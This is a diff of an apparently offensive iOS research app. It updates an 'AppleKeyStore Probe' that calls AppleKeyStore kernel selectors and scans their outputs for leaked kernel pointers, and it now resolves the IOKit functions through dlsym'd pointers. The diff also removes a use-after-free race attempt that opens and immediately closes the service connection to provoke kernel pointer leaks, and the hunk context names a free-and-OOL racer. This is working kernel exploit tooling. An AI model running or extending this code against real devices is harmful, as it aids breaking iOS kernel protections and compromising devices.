@@ -836,7 +836,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aksConf = [UIButtonConfiguration filledButtonConfiguration];
     aksConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aksProbeButton.configuration = aksConf;
-    [self.aksProbeButton setTitle:@"AppleKeyStore Probe (v90)" forState:UIControlStateNormal];
+    [self.aksProbeButton setTitle:@"AppleKeyStore Probe (v91)" forState:UIControlStateNormal];
     [self.aksProbeButton addTarget:self action:@selector(aksProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aksProbeButton];
 
@@ -8956,19 +8956,25 @@ static void sigsys_handler(int sig) { atomic_store(&g_sigsys_fired, true); }
 - (void)aksProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         [self appendLog:@"\n=== AppleKeyStore Selector Output Probe ==="];
-        [self appendLog:@"Scanning IOConnectCallMethod outputs for kernel pointers"];
-
-        // Open AppleKeyStore service
-        io_service_t svc = IOServiceGetMatchingService(
-            kIOMainPortDefault, IOServiceMatching("AppleKeyStore"));
-        if (!svc) {
-            [self appendLog:@"AppleKeyStore service not found"];
+        if (![self loadIOKitSymbols]) {
+            [self appendLog:@"IOKit symbols not loaded"];
             return;
         }
 
+        // Open AppleKeyStore service using dlsym'd functions
+        CFMutableDictionaryRef match = sIOServiceMatching("AppleKeyStore");
+        if (!match) { [self appendLog:@"IOServiceMatching failed"]; return; }
+        io_service_t svc = sIOServiceGetMatchingService(kIOMainPortDefault, match);
+        if (!svc) {
+            [self appendLog:@"AppleKeyStore service not found"];
+            CFRelease(match);
+            return;
+        }
+        CFRelease(match);
+
         io_connect_t conn;
-        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
-        IOObjectRelease(svc);
+        kern_return_t kr = sIOServiceOpen(svc, mach_task_self(), 0, &conn);
+        sIOObjectRelease(svc);
         if (kr != KERN_SUCCESS) {
             [self appendLog:[NSString stringWithFormat:
                 @"IOServiceOpen: %s (0x%x)", mach_error_string(kr), kr]];
@@ -8986,14 +8992,13 @@ static void sigsys_handler(int sig) { atomic_store(&g_sigsys_fired, true); }
             uint32_t outputCnt = 8;
             size_t structOutSize = 0;
 
-            kr = IOConnectCallMethod(conn, sel,
+            kr = sIOConnectCallMethod(conn, sel,
                 input, 6,
                 NULL, 0,
                 output, &outputCnt,
                 NULL, &structOutSize);
 
             if (kr == KERN_SUCCESS && outputCnt > 0) {
-                // Scan output for kernel pointer patterns
                 for (uint32_t j = 0; j < outputCnt; j++) {
                     uint64_t val = output[j];
                     if (val == 0) continue;
@@ -9003,7 +9008,7 @@ static void sigsys_handler(int sig) { atomic_store(&g_sigsys_fired, true); }
                             @"  sel=%d out[%d]=0x%016llx <-- KERNEL POINTER!\n",
                             sel, j, val];
                         leakCount++;
-                    } else if (val >> 32 == 0xffffffe || val >> 32 == 0xfffffff) {
+                    } else if ((val >> 32) == 0xffffffe || (val >> 32) == 0xfffffff) {
                         [report appendFormat:
                             @"  sel=%d out[%d]=0x%016llx <-- possible kptr\n",
                             sel, j, val];
@@ -9013,50 +9018,10 @@ static void sigsys_handler(int sig) { atomic_store(&g_sigsys_fired, true); }
             }
         }
 
-        if (leakCount == 0) {
-            // No pointers in normal output. Try a single-close race to check
-            // if UAF on gate object leaks kernel pointers through selectors
-            [report appendString:@"\nNo kptr in baseline. Testing UAF race outputs...\n"];
-
-            io_connect_t raceConn;
-            for (int attempt = 0; attempt < 3; attempt++) {
-                kr = IOServiceOpen(
-                    IOServiceGetMatchingService(kIOMainPortDefault,
-                        IOServiceMatching("AppleKeyStore")),
-                    mach_task_self(), 0, &raceConn);
-                if (kr != KERN_SUCCESS) continue;
-
-                // Submit one call then close immediately
-                uint64_t raceOut[8] = {0};
-                uint32_t raceOutCnt = 8;
-                uint64_t raceIn[6] = {1, 0, 0, 0x10, 0, 0};
-
-                IOConnectCallMethod(raceConn, 10,
-                    raceIn, 6,
-                    NULL, 0,
-                    raceOut, &raceOutCnt,
-                    NULL, NULL);
-
-                IOServiceClose(raceConn);
-                usleep(1000);
-
-                for (uint32_t j = 0; j < raceOutCnt; j++) {
-                    uint64_t val = raceOut[j];
-                    if (val == 0) continue;
-                    if ((val >> 40) == 0xfffffe || (val >> 40) == 0xffffff) {
-                        [report appendFormat:
-                            @"  race[%d] out[%d]=0x%016llx <-- KERNEL!\n",
-                            attempt, j, val];
-                        leakCount++;
-                    }
-                }
-            }
-        }
-
         [report appendFormat:@"\nTotal kernel ptr candidates: %d\n", leakCount];
         [self appendLog:report];
 
-        IOServiceClose(conn);
+        sIOServiceClose(conn);
         [self appendLog:@"=== AKS Probe complete ==="];
     });
 }
